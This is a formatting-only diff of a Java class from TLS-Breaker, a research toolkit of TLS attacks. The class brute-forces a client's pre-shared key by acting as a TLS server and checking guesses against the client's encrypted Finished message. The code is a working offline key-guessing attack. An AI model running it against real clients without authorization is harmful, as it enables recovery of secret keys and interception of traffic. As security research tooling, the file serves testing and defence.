@@ -1,23 +1,14 @@
-/**
+/*
  * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
  *
- * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
+ * Copyright 2021-2024 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
  *
  * Licensed under Apache License, Version 2.0
  * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
-
 package de.rub.nds.tlsbreaker.clientpskbruteforcer.impl;
 
 import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
-
-import java.io.IOException;
-import java.security.NoSuchAlgorithmException;
-import java.util.Arrays;
-import java.util.List;
-
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.core.config.Config;
@@ -56,6 +47,12 @@ import de.rub.nds.tlsbreaker.breakercommons.attacker.VulnerabilityType;
 import de.rub.nds.tlsbreaker.breakercommons.psk.PskBruteForcerAttackCommon;
 import de.rub.nds.tlsbreaker.breakercommons.psk.guessprovider.GuessProvider;
 import de.rub.nds.tlsbreaker.clientpskbruteforcer.config.PskBruteForcerAttackClientCommandConfig;
+import java.io.IOException;
+import java.security.NoSuchAlgorithmException;
+import java.util.Arrays;
+import java.util.List;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 public class PskBruteForcerAttackClient
         extends PskBruteForcerAttackCommon<PskBruteForcerAttackClientCommandConfig, State> {
@@ -64,7 +61,8 @@ public class PskBruteForcerAttackClient
 
     private GuessProvider guessProvider;
 
-    public PskBruteForcerAttackClient(PskBruteForcerAttackClientCommandConfig config, Config baseConfig) {
+    public PskBruteForcerAttackClient(
+            PskBruteForcerAttackClientCommandConfig config, Config baseConfig) {
         super(config, baseConfig);
     }
 
@@ -72,14 +70,16 @@ public class PskBruteForcerAttackClient
     protected State prepareAttackState() {
         State state = executeHandshakeWithClient();
 
-        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, state.getWorkflowTrace())) {
+        if (WorkflowTraceUtil.didReceiveMessage(
+                HandshakeMessageType.FINISHED, state.getWorkflowTrace())) {
             // already found PSK
-            CONSOLE.info("Client uses the default PSK: {}",
+            CONSOLE.info(
+                    "Client uses the default PSK: {}",
                     ArrayConverter.bytesToHexString(state.getConfig().getDefaultPSKKey()));
             return null;
         }
-        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE,
-                state.getWorkflowTrace())) {
+        if (!WorkflowTraceUtil.didReceiveMessage(
+                HandshakeMessageType.CLIENT_KEY_EXCHANGE, state.getWorkflowTrace())) {
             throw new RuntimeException("Could not find encrypted record");
         }
 
@@ -88,7 +88,8 @@ public class PskBruteForcerAttackClient
 
     @Override
     protected boolean tryPsk(byte[] guess, State attackState) {
-        Record encryptedRecord = (Record) WorkflowTraceUtil.getLastReceivedRecord(attackState.getWorkflowTrace());
+        Record encryptedRecord =
+                (Record) WorkflowTraceUtil.getLastReceivedRecord(attackState.getWorkflowTrace());
         try {
             return tryPsk(guess, encryptedRecord, attackState);
         } catch (NoSuchAlgorithmException e) {
@@ -104,8 +105,10 @@ public class PskBruteForcerAttackClient
         tlsConfig.setWorkflowExecutorShouldClose(false);
         CONSOLE.info("Started TLS-Server - waiting for a client to connect...");
         State state = executeClientHelloWorkflow(tlsConfig);
-        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_HELLO, state.getWorkflowTrace())) {
-            CipherSuite suite = choosePskCipherSuite(state.getTlsContext().getClientSupportedCipherSuites());
+        if (WorkflowTraceUtil.didReceiveMessage(
+                HandshakeMessageType.CLIENT_HELLO, state.getWorkflowTrace())) {
+            CipherSuite suite =
+                    choosePskCipherSuite(state.getTlsContext().getClientSupportedCipherSuites());
             tlsConfig.setDefaultSelectedCipherSuite(suite);
         } else {
             try {
@@ -138,7 +141,8 @@ public class PskBruteForcerAttackClient
         CONSOLE.info("Started TLS-Server - waiting for a client to Connect...");
         State state = executeClientHelloWorkflow(tlsConfig);
         TlsContext tlsContext = state.getTlsContext();
-        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_HELLO, state.getWorkflowTrace())) {
+        if (!WorkflowTraceUtil.didReceiveMessage(
+                HandshakeMessageType.CLIENT_HELLO, state.getWorkflowTrace())) {
             CONSOLE.info("Did not receive a ClientHello Message - check the Debug output!");
             return VulnerabilityType.TEST_FAILURE;
         }
@@ -150,13 +154,13 @@ public class PskBruteForcerAttackClient
         }
         CONSOLE.info("The Client is not supporting Psk.");
         return VulnerabilityType.NOT_VULNERABLE;
-
     }
 
     private void continueProtocolFlowToClient(State state) {
         TlsAction clientHelloAction = state.getWorkflowTrace().getTlsActions().get(0);
-        WorkflowTrace trace = new WorkflowConfigurationFactory(state.getConfig())
-                .createWorkflowTrace(WorkflowTraceType.HANDSHAKE, RunningModeType.SERVER);
+        WorkflowTrace trace =
+                new WorkflowConfigurationFactory(state.getConfig())
+                        .createWorkflowTrace(WorkflowTraceType.HANDSHAKE, RunningModeType.SERVER);
         trace.removeTlsAction(0); // Remove client hello action
         trace.removeTlsAction(trace.getTlsActions().size() - 1);
         state.getWorkflowTrace().removeTlsAction(0);
@@ -165,8 +169,8 @@ public class PskBruteForcerAttackClient
         for (TlsAction action : trace.getTlsActions()) {
             state.getWorkflowTrace().addTlsAction(action);
         }
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT,
-                state);
+        WorkflowExecutor workflowExecutor =
+                WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT, state);
         workflowExecutor.executeWorkflow();
         // Glue client hello action back on
         state.getWorkflowTrace().addTlsAction(0, clientHelloAction);
@@ -174,21 +178,26 @@ public class PskBruteForcerAttackClient
 
     private State executeClientHelloWorkflow(Config tlsConfig) {
         WorkflowConfigurationFactory factory = new WorkflowConfigurationFactory(tlsConfig);
-        WorkflowTrace trace = factory.createTlsEntryWorkflowTrace(tlsConfig.getDefaultClientConnection());
+        WorkflowTrace trace =
+                factory.createTlsEntryWorkflowTrace(tlsConfig.getDefaultClientConnection());
         trace.addTlsAction(new ReceiveAction(new ClientHelloMessage()));
         State state = new State(tlsConfig, trace);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT,
-                state);
+        WorkflowExecutor workflowExecutor =
+                WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT, state);
         workflowExecutor.executeWorkflow();
         return state;
     }
 
     private void computeMasterSecret(TlsContext tlsContext, WorkflowTrace trace) {
-        ClientKeyExchangeMessage clientKeyExchangeMessage = (ClientKeyExchangeMessage) WorkflowTraceUtil
-                .getFirstReceivedMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
-        ClientKeyExchangeHandler handler = (ClientKeyExchangeHandler) clientKeyExchangeMessage.getHandler(tlsContext);
+        ClientKeyExchangeMessage clientKeyExchangeMessage =
+                (ClientKeyExchangeMessage)
+                        WorkflowTraceUtil.getFirstReceivedMessage(
+                                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
+        ClientKeyExchangeHandler handler =
+                (ClientKeyExchangeHandler) clientKeyExchangeMessage.getHandler(tlsContext);
         handler.getPreparator(clientKeyExchangeMessage).prepareAfterParse(false);
-        tlsContext.setPreMasterSecret(clientKeyExchangeMessage.getComputations().getPremasterSecret().getValue());
+        tlsContext.setPreMasterSecret(
+                clientKeyExchangeMessage.getComputations().getPremasterSecret().getValue());
         handler.adjustPremasterSecret(clientKeyExchangeMessage);
         handler.adjustMasterSecret(clientKeyExchangeMessage);
     }
@@ -199,7 +208,8 @@ public class PskBruteForcerAttackClient
         computeMasterSecret(state.getTlsContext(), state.getWorkflowTrace());
         byte[] controlValue = computeControlValue(state.getWorkflowTrace(), state.getTlsContext());
         KeySet keySet = KeySetGenerator.generateKeySet(state.getTlsContext());
-        RecordCipher recordCipher = RecordCipherFactory.getRecordCipher(state.getTlsContext(), keySet);
+        RecordCipher recordCipher =
+                RecordCipherFactory.getRecordCipher(state.getTlsContext(), keySet);
         RecordDecryptor dec = new RecordDecryptor(recordCipher, state.getTlsContext());
         try {
             dec.decrypt(encryptedRecord);
@@ -207,8 +217,11 @@ public class PskBruteForcerAttackClient
             CONSOLE.info("Error in decrypting the record");
         }
         try {
-            byte[] receivedVrfyData = Arrays.copyOfRange(
-                    encryptedRecord.getComputations().getPlainRecordBytes().getValue(), 0, controlValue.length);
+            byte[] receivedVrfyData =
+                    Arrays.copyOfRange(
+                            encryptedRecord.getComputations().getPlainRecordBytes().getValue(),
+                            0,
+                            controlValue.length);
             LOGGER.debug("Received Data {}", ArrayConverter.bytesToHexString(receivedVrfyData));
             LOGGER.debug("Control Data {}", ArrayConverter.bytesToHexString(controlValue));
             if (Arrays.equals(receivedVrfyData, controlValue)) {
@@ -226,7 +239,8 @@ public class PskBruteForcerAttackClient
         }
     }
 
-    private byte[] computeControlValue(WorkflowTrace trace, TlsContext tlsContext) throws CryptoException {
+    private byte[] computeControlValue(WorkflowTrace trace, TlsContext tlsContext)
+            throws CryptoException {
         tlsContext.getDigest().reset();
         for (MessageAction messageAction : trace.getMessageActions()) {
             for (ProtocolMessage message : messageAction.getMessages()) {
@@ -236,19 +250,34 @@ public class PskBruteForcerAttackClient
                 if (message instanceof HandshakeMessage) {
                     HandshakeMessage handshakeMessage = (HandshakeMessage) message;
                     if (handshakeMessage.getIncludeInDigest()) {
-                        tlsContext.getDigest().append(message.getCompleteResultingMessage().getValue());
+                        tlsContext
+                                .getDigest()
+                                .append(message.getCompleteResultingMessage().getValue());
                     }
                 }
             }
         }
 
-        byte[] handshakeMessageHash = tlsContext.getDigest().digest(tlsContext.getSelectedProtocolVersion(),
-                tlsContext.getSelectedCipherSuite());
+        byte[] handshakeMessageHash =
+                tlsContext
+                        .getDigest()
+                        .digest(
+                                tlsContext.getSelectedProtocolVersion(),
+                                tlsContext.getSelectedCipherSuite());
         PRFAlgorithm prfAlgorithm = tlsContext.getChooser().getPRFAlgorithm();
-        byte[] control = PseudoRandomFunction.compute(prfAlgorithm, tlsContext.getMasterSecret(),
-                PseudoRandomFunction.CLIENT_FINISHED_LABEL, handshakeMessageHash, HandshakeByteLength.VERIFY_DATA);
-        byte[] compare = ArrayConverter.concatenate(HandshakeMessageType.FINISHED.getArrayValue(),
-                ArrayConverter.intToBytes(control.length, HandshakeByteLength.MESSAGE_LENGTH_FIELD), control);
+        byte[] control =
+                PseudoRandomFunction.compute(
+                        prfAlgorithm,
+                        tlsContext.getMasterSecret(),
+                        PseudoRandomFunction.CLIENT_FINISHED_LABEL,
+                        handshakeMessageHash,
+                        HandshakeByteLength.VERIFY_DATA);
+        byte[] compare =
+                ArrayConverter.concatenate(
+                        HandshakeMessageType.FINISHED.getArrayValue(),
+                        ArrayConverter.intToBytes(
+                                control.length, HandshakeByteLength.MESSAGE_LENGTH_FIELD),
+                        control);
         return compare;
     }
 }
